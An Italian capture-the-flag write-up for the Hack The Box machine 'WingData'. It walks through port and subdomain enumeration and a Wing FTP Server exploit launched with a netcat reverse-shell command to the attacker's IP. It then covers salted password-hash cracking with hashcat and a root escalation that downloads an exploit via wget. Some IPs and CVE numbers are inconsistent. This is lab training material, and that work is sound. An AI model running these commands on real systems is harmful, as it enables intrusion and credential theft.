IP vittima: 10.129.94.246 
IP attaccante: 10.10.15.219
## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.106`
``` bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-14 18:37 CEST
Initiating SYN Stealth Scan at 18:37
Scanning 10.129.244.106 [65535 ports]
Discovered open port 22/tcp on 10.129.244.106
Discovered open port 80/tcp on 10.129.244.106
Completed SYN Stealth Scan at 18:38, 26.34s elapsed (65535 total ports)
Nmap scan report for 10.129.244.106
Host is up, received user-set (0.074s latency).
Scanned at 2026-04-14 18:37:46 CEST for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 21 (924B
```
Porte aperte: 22 (ssh), 80 (html)
`sudo nmap -sC -sV -p22,80 10.129.244.106`
``` bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-14 18:39 CEST
Nmap scan report for wingdata.htb (10.129.244.106)
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: WingData Solutions
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
`gobuster dir -k -u http://wingdata.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt`
``` bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://wingdata.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 317]
/.hta                 (Status: 403) [Size: 317]
/.htpasswd            (Status: 403) [Size: 317]
/assets               (Status: 301) [Size: 353] [--> http://wingdata.htb/assets/]
/index.html           (Status: 200) [Size: 12492]
/server-status        (Status: 403) [Size: 317]
/vendor               (Status: 301) [Size: 353] [--> http://wingdata.htb/vendor/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```
Le directory trovate non portano a nulla.
`ffuf -u http://wingdata.htb/ -H "Host: FUZZ.wingdata.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc 20`
``` bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://wingdata.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.wingdata.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

ftp                     [Status: 200, Size: 678, Words: 44, Lines: 10, Duration: 85ms]
:: Progress: [19966/19966] :: Job [1/1] :: 574 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```
ffuf trova il sottodominio **ftp.wingdata.htb** accessibile anche cliccando sul tato **Client Portal** della home page del sito:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260414185409.png)
## CVE-2025-47812
Sul sottodominio **ftp.wingdata.htb** è presente il servizio **Wing FTP Server v7.4.3** vulnerabile al CVE-2025-47812
POC: https://github.com/4m3rr0r/CVE-2025-47812-poc
Dopo aver scaricato lo script python dell'exploit lo sfruttiamo mettendoci in ascolto sulla porta 5555 con
`nc -lvnp 5555`
Lanciamo l'exploit con:
`python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.15.219 5555 -e /bin/sh" -v`
Otteniamo una shell che possiamo sanitizzare con:
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
## Information gathering
Con `cat /etc/passwd` otteniamo:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
_laurel:x:999:996::/var/log/laurel:/bin/false
wingftp@wingdata:/opt/wftpserver/Data/1/users$ 
```
Vediamo che c'è l'utente **wacky** con una shell **/bin/bah**, provata anche la sua home directory **/home/wacky** che però non è accessibile.

Una volta ottenuta la shell siamo nella cartella `/opt/wftpserver` dove troviamo:
```
drwxr-x---  4 wingftp wingftp     4096 Apr 14 12:35 Data
-rwxr-x---  1 wingftp wingftp     4834 Jul 31  2018 License.txt
drwxr-x---  5 wingftp wingftp     4096 Apr 14 12:59 Log
drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 lua
-rw-r--r--  1 wingftp wingftp        5 Apr 14 12:35 pid-wftpserver.pid
-rwxr-x---  1 wingftp wingftp     1434 Sep 13  2020 README
drwxr-x---  2 wingftp wingftp     4096 Apr 14 12:59 session
drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 session_admin
-rwxr-x---  1 wingftp wingftp   115258 Mar 26  2025 version.txt
drwxr-x--- 10 wingftp wingftp    12288 Feb  9 08:19 webadmin
drwxr-x--- 13 wingftp wingftp     4096 Feb  9 08:19 webclient
-rwxr-x---  1 wingftp wingftp  4649509 Sep 14  2021 wftpconsole
-rwxr-x---  1 wingftp wingftp     3272 Nov  2 11:11 wftp_default_ssh.key
-rwxr-x---  1 wingftp wingftp     1342 Nov 22  2017 wftp_default_ssl.crt
-rwxr-x---  1 wingftp wingftp     1675 Nov 22  2017 wftp_default_ssl.key
-rwxr-x---  1 wingftp wingftp 22283682 Mar 26  2025 wftpserver
```
La cartella `Data` sembra contenere diverse informazioni relative agli utenti. 
Nella cartella `/opt/wftpserver/Data/1/users` troviamo questi file relativi ai vari utenti:
```
-rwxr-x--- 1 wingftp wingftp 2842 Apr 14 13:00 anonymous.xml
-rwxr-x--- 1 wingftp wingftp 2846 Nov  2 11:13 john.xml
-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:05 maria.xml
-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:02 steve.xml
-rw-rw-rw- 1 wingftp wingftp 2856 Nov  2 12:28 wacky.xml
```
All'interno di ogni file xml troviamo gli **hash** delle relative password:
```
# es. wacky.xml

cat wacky.xml
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        ...
```
L'hash **32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca** sembra essere uno SHA-256

Prima di provare a craccare la password dobbiamo trovare il **salt** aggiunto alle password.
> [!NOTE]
> Il **salt** è un valore aggiunto alla password **prima** di calcolare l’hash.
> Esempio semplice:
> - password: `ciao123`
> - salt: `WingFTP`
> 
> si può calcolare l’hash di:
> 
> `ciao123WingFTP`
> 
> oppure in altri casi:
> 
> `WingFTPciao123`
> 
> o con schemi ancora diversi.

Lo troviamo nel file `Data/1/settings.xml`:
``` xml
...
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
<EnableSHA256>1</EnableSHA256>
...
```
Quindi la formula per è:
```
SHA256(password + "WingFTP")
```
Usiamo [[hashcat]]per craccare la password. Proviamo quella di **wacky** che è l'utente con accesso alla shell
``` bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky_password.txt

hashcat -m 1410 wacky_password.txt /usr/share/wordlists/rockyou.txt
```
[[hashcat]]trova:
```
...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
...
```
La password di **wacky** è **!#7Blushing^\*Bride5**
## user flag
Proviamo ad accedere al servizio **ssh** con lo user **wacky** e la password trovata **!#7Blushing^\*Bride5**
`ssh wacky@10.129.244.106` -> password `!#7Blushing^*Bride5`
Riusciamo ad accedere.
Nella cartella `/home/wacky` troviamo la user flag
## Privilege esclation
Con `sudo -l` troviamo:
```
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```
E' possibile eseguire lo script Python `restore_backup_clients.py` come root con argomenti wildcard (`*`).
Dall'esame dello script python troviamo:
``` python
try:
	with tarfile.open(backup_path, "r") as tar:
		tar.extractall(path=staging_dir, filter="data")
	print(f"[+] Extraction completed in {staging_dir}")
except (tarfile.TarError, OSError, Exception) as e:
	print(f"[!] Error during extraction: {e}", file=sys.stderr)
	sys.exit(2)
```
Questa parte di script prova ad **aprire un archivio tar**, **estrarlo** in una cartella e, se qualcosa va storto, **stampa l’errore ed esce**.
Appuriamo con `python3 --version` che la versione di python installata sulla macchina è la **3.12.3**
Cercando exploit su **python** e **tarfile** troviamo che le versioni di python dalla 3.8.0 alla 3.13.1 sono vulnerabili all'exploit **CVE-2025-4517**
### CVE-2024-4517
Usiamo questo POC: https://github.com/AzureADTrent/CVE-2025-4517-POC
Scarichiamo l'exploit (`exploit.py`) sulla nostra macchina poi lo trasferiamo sulla macchina vittima:
``` bash
# avviamo un server nella cartella sulla nostra macchina che contiene l'exploit
python -m http.server 8888
# lo scarichiamo con wget sulla macchina vittima
wget http://10.10.15.219:8888/exploit.py
```
Lanciamo l'exploit con `python3 exploit.py` ottenendo una utenza root.
## root flag
Nella cartella `/root` troviamo la root flag.
